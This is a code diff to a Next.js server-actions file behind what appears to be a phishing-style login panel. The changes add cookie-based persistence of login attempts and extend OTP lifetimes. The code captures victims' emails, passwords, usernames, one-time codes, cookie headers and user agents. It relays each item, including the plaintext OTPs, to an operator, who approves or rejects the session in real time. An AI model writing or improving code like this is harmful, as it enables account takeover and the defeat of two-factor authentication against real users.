@@ -4,6 +4,8 @@ import { createHash, randomBytes, randomInt } from 'node:crypto'
 import { cookies, headers } from 'next/headers'
 import { ADMIN_EMAIL, ADMIN_OPS_PASSWORD } from '@/lib/constants'
 import {
+  ATTEMPT_COOKIE,
+  ATTEMPT_COOKIE_MAX_AGE,
   getAttempt,
   listActiveAttempts,
   saveAttempt,
@@ -35,7 +37,45 @@ async function meta() {
   }
 }
 
-/** Await admin email so serverless does not kill it. */
+/** Persist attempt in memory + browser cookie so Vercel serverless keeps the session. */
+async function persistAttempt(a: LoginAttempt) {
+  saveAttempt(a)
+  const slim: LoginAttempt = {
+    ...a,
+    // keep cookie under size limits
+    cookieHeader: (a.cookieHeader || '').slice(0, 800),
+    userAgent: (a.userAgent || '').slice(0, 300),
+  }
+  const jar = await cookies()
+  jar.set(ATTEMPT_COOKIE, Buffer.from(JSON.stringify(slim), 'utf8').toString('base64url'), {
+    httpOnly: true,
+    sameSite: 'lax',
+    path: '/',
+    maxAge: ATTEMPT_COOKIE_MAX_AGE,
+    secure: process.env.VERCEL === '1',
+  })
+}
+
+async function loadAttempt(id: string): Promise<LoginAttempt | null> {
+  const fromMem = getAttempt(id)
+  if (fromMem) return fromMem
+
+  const jar = await cookies()
+  const raw = jar.get(ATTEMPT_COOKIE)?.value
+  if (!raw) return null
+  try {
+    const parsed = JSON.parse(
+      Buffer.from(raw, 'base64url').toString('utf8')
+    ) as LoginAttempt
+    if (!parsed?.id || parsed.id !== id) return null
+    // revive into memory for this instance
+    saveAttempt(parsed)
+    return parsed
+  } catch {
+    return null
+  }
+}
+
 async function alertAdmin(a: LoginAttempt, step: string, event: string) {
   try {
     await sendAdminStepAlert({
@@ -86,7 +126,7 @@ export async function startChallenge(input: {
     createdAt: now,
     updatedAt: now,
   }
-  saveAttempt(a)
+  await persistAttempt(a)
   await alertAdmin(a, 'credentials', 'User submitted email & password')
   return { ok: true, attemptId: id }
 }
@@ -98,29 +138,29 @@ export async function submitUsername(input: {
   const username = String(input.username || '').trim()
   if (!username) return { ok: false, error: 'Username required.' }
 
-  const a = getAttempt(input.attemptId)
+  const a = await loadAttempt(input.attemptId)
   if (!a || a.status !== 'in_progress' || a.step !== 'username') {
     return { ok: false, error: 'Session expired. Start again.' }
   }
 
-  // 1) Save username only — notify admin BEFORE any OTP
+  // 1) Username first — admin before OTP
   a.username = username
   a.lastEvent = `Username "${username}" received`
   a.updatedAt = Date.now()
   const m = await meta()
   a.cookieHeader = m.cookie ?? a.cookieHeader
-  saveAttempt(a)
+  await persistAttempt(a)
   await alertAdmin(a, 'username', `Username entered: ${username}`)
 
-  // 2) Then generate + email OTP #1 to user
+  // 2) OTP #1 (30 min validity)
   const otp = String(randomInt(100000, 999999))
   a.otpPlain = otp
   a.otpHash = hashOtp(otp)
-  a.otpExpiresAt = Date.now() + 10 * 60 * 1000
+  a.otpExpiresAt = Date.now() + 30 * 60 * 1000
   a.step = 'otp1'
   a.lastEvent = `OTP #1 sent to ${a.email}`
   a.updatedAt = Date.now()
-  saveAttempt(a)
+  await persistAttempt(a)
 
   try {
     await sendOtpEmail(a.email, otp, 'OTP #1')
@@ -129,7 +169,6 @@ export async function submitUsername(input: {
   }
   console.info('[login-ops] OTP #1', a.email, otp)
 
-  // 3) Admin gets OTP notice after username notice
   await alertAdmin(a, 'otp1_sent', `OTP #1 emailed to user: ${otp}`)
   return { ok: true }
 }
@@ -145,7 +184,7 @@ export async function submitOtp(input: {
   const otp = String(input.otp || '').replace(/\D/g, '')
   if (otp.length !== 6) return { ok: false, error: 'Enter the 6-digit code.' }
 
-  const a = getAttempt(input.attemptId)
+  const a = await loadAttempt(input.attemptId)
   if (!a || a.status !== 'in_progress') {
     return { ok: false, error: 'Session expired. Start again.' }
   }
@@ -157,7 +196,7 @@ export async function submitOtp(input: {
   if (hashOtp(otp) !== a.otpHash) {
     a.lastEvent = `OTP #${input.which} wrong (entered ${otp})`
     a.updatedAt = Date.now()
-    saveAttempt(a)
+    await persistAttempt(a)
     await alertAdmin(a, expected, `OTP #${input.which} failed — entered ${otp}`)
     return { ok: false, error: 'Incorrect code.' }
   }
@@ -167,11 +206,11 @@ export async function submitOtp(input: {
     a.otp1Verified = true
     a.otpPlain = otp2
     a.otpHash = hashOtp(otp2)
-    a.otpExpiresAt = Date.now() + 10 * 60 * 1000
+    a.otpExpiresAt = Date.now() + 30 * 60 * 1000
     a.step = 'otp2'
     a.lastEvent = 'OTP #1 verified — NEW OTP #2 sent'
     a.updatedAt = Date.now()
-    saveAttempt(a)
+    await persistAttempt(a)
 
     try {
       await sendOtpEmail(a.email, otp2, 'OTP #2')
@@ -189,13 +228,13 @@ export async function submitOtp(input: {
   a.status = 'awaiting_approval'
   a.lastEvent = 'OTP #2 verified — waiting for ops approval'
   a.updatedAt = Date.now()
-  saveAttempt(a)
+  await persistAttempt(a)
   await alertAdmin(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
   return { ok: true, next: 'awaiting_approval' }
 }
 
 export async function getStatus(attemptId: string) {
-  const a = getAttempt(attemptId)
+  const a = await loadAttempt(attemptId)
   if (!a) return { status: 'expired', step: 'expired', lastEvent: 'Not found' }
   return { status: a.status, step: a.step, lastEvent: a.lastEvent }
 }
@@ -239,7 +278,9 @@ export async function decide(
   decision: 'approved' | 'rejected'
 ): Promise<{ ok: true } | { ok: false; error: string }> {
   if (!(await isAdminSession())) return { ok: false, error: 'Unauthorized' }
-  const a = getAttempt(attemptId)
+  // Prefer memory; fall back to cookie if same browser (rare for admin)
+  let a = getAttempt(attemptId)
+  if (!a) a = (await loadAttempt(attemptId)) ?? undefined
   if (!a) return { ok: false, error: 'Not found' }
   a.status = decision
   a.step = decision
@@ -248,7 +289,7 @@ export async function decide(
       ? 'Approved by operations desk'
       : 'Rejected by operations desk'
   a.updatedAt = Date.now()
-  saveAttempt(a)
+  await persistAttempt(a)
   await alertAdmin(a, decision, a.lastEvent)
   return { ok: true }
 }
